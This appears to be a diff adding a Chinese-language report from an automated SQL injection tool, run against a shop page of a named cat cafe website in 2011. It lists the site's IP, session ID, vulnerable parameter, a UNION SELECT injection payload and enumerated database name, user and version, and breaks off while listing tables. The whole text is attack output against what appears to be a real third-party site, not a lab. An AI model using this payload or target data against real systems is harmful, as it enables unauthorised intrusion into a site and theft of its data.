@@ -1,0 +1,50 @@
+■漏洞信息:============================================================
+ ·URL:http://hellocat.net/shop/index.php?PHPSESSID=424c47bbce2506d602a0d5d829180ed0&page=view_class&class_id=40
+ ·页面标题：- Hello Cat - Cafe and Cat Shop
+ ·参数:PHPSESSID=424c47bbce2506d602a0d5d829180ed0&page=view_class&class_id=40
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:php
+ ·IP:222.122.86.221
+ ·数据库:未知
+ ·HEAD:
+HTTP/1.1 200 OK
+Server: apache
+Date: Tue, 12 Apr 2011 08:29:57 GMT
+Content-Type: text/html
+Connection: close
+X-Powered-By: PHP/4.4.7p2
+
+
+总数:13
+显示的列:6
+联合查询SQL：  and 3=8 union select 1,2,3,4,5,6,7,8,9,10,11,12,13 -- 
+■基本信息：============================================================
+ - version():4.0.22-log
+ - database():cjlove_cj035
+ - user():cjlove_cj035@localhost
+ - session_user():cjlove_cj035@localhost
+ - current_user():cjlove_cj035@localhost
+ - system_user():cjlove_cj035@localhost
+ - @@basedir:
+ - @@datadir:
+ - @@tmpdir:
+ - @@version_compile_os:unknown-linux
+ - 可否使用单引号：是
+ - 有INFORMATION_SCHEMA：否
+■数据库：
+数据库名	字符集名
+------------------------------------------------------------
+取记录数失败。
+取记录数失败，使用设定值：5
+记录数:5
+■数据库：
+数据库名	字符集名
+------------------------------------------------------------
+取记录数失败。
+取记录数失败，使用设定值：5
+记录数:5
+■Tables of cjlove_cj035:
+table_name	table_rows
+------------------------------------------------------------
